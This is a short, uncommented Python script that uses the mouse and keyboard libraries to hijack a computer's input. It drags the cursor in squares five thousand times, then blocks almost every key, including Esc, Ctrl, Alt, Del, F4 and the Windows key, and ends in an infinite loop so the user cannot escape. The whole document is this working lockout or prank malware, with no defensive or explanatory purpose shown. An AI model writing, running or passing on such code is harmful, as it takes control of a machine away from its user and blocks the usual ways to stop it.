import mouse
import keyboard
x = int(0)
block = [
    "q", "w", "e", "r", "t", "y", "u", "i", "o", "p", "[", "]",
    "a", "s", "d", "f", "g", "h", "j", "k", "l", ";", "'", "\n",
    "z", "x", "c", "v", "b", "n", "m", ",", ".", "/",
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    "*", "-", "=", "+", "|", "`",
    "\t", " ", "shift", "windows", "alt", "esc", "backspace", "ctrl", "f4", "del"
]

while(x < 5000):
    mouse.move(200, 0, absolute=False, duration=0.05)
    mouse.move(0, -200, absolute=False, duration=0.05)
    mouse.move(-200, 0, absolute=False, duration=0.05)
    mouse.move(0, 200, absolute=False, duration=0.05)
    x += 1
for key in block:
    keyboard.block_key(key)
while True:
    pass
